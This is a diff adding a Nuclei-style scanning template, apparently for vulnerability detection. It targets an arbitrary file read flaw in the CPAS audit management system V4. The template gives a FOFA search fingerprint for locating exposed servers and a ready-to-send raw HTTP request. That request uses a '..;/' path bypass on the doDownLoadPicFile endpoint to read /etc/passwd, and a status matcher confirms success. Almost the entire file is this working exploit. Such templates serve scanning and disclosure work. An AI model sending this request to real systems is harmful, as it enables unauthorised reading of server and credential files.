@@ -1,0 +1,27 @@
+id: poc-mhgysgaiurdqe7zp
+info:
+  name: 友数聚CPAS审计管理系统V4 doDownLoadPicFile 任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mhgysgaiurdqe7zp'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mhgysgaiurdqe7zp
+    fofa: body="/cpasm4/static/cap/font/iconfont.css"
+http:
+- raw:
+  - 'GET /cpasm4/static/..;/mobileUploadPictureController/doDownLoadPicFile?picPath=/etc/passwd&fileType=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
